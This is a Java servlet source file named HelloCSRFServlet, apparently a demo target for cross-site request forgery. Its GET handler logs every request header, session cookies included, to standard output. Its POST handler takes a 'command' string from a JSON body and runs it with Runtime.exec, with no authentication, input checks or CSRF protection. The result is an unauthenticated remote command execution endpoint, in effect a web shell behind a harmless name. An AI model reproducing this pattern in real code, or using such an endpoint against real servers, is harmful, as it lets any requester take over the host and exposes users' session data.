package org.lazyjava.servlet;

import java.io.IOException;
import java.io.PrintWriter;
import java.util.Enumeration;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.json.JSONException;
import org.json.JSONObject;

@WebServlet(urlPatterns = {"/s/hellocsrf", "/hellocsrf"})
public class HelloCSRFServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;

    public HelloCSRFServlet() {
    }

	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

		ServletUtil.utf8Encoding(request, response);
		
		PrintWriter out = response.getWriter();
		String requestURL = request.getRequestURL().toString();
		String serverName = request.getServerName();
		String contextPath = request.getContextPath();
		String servletPath = request.getServletPath();
		String queryString = request.getQueryString();
		String sessionId = request.getSession().getId();
		//System.out.println("sessionId = " + sessionId);
		/*
		System.out.println("requestURL = " + requestURL);
		System.out.println("serverName = " + serverName);
		System.out.println("contextPath = " + contextPath);
		System.out.println("servletPath = " + servletPath);
		System.out.println("queryString = " + queryString);
		System.out.println("Method = " + request.getMethod());
		requestURL = http://210.242.73.140/pus/services/helloworld
		serverName = 210.242.73.140
		contextPath = /pus
		servletPath = /services/helloworld
		queryString = null
		Method = GET
		*/
		
		try {
			//JSONObject output = new JSONObject();
			//output.put("url", request.getServletPath());
			//output.put("str", "Hello World");
			Enumeration<String> headerNames = request.getHeaderNames();
	        while (headerNames.hasMoreElements()) {
	            String headerName = headerNames.nextElement();
	            //out.write(headerName);
	            //out.write("n");
	            System.out.println("headerName = " + headerName);
	            Enumeration<String> headers = request.getHeaders(headerName);
	            while (headers.hasMoreElements()) {
	                String headerValue = headers.nextElement();
	                System.out.println("headerValue = " + headerValue);
	            }
	        }
			
			out.print("Hello_CRSF");
			
			out.flush();
			out.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		
		ServletUtil.utf8Encoding(request, response);
		
		JSONObject output = new JSONObject();
		PrintWriter out = response.getWriter();

		try {
			String reqBody = ServletUtil.getServletRequestBody(request);
			JSONObject req = new JSONObject(reqBody);
			
			String[] cmd = req.getString("command").split(" ");
			for(String s : cmd)
				System.out.println("command:" + s);
			Runtime.getRuntime().exec(cmd);
			
			output.put("data", req.toString());
		} catch (JSONException e) {
			e.printStackTrace();
		} 
		
		out.print(output);
		//out.write(output.toString());
		out.flush();
		out.close();
	}
}
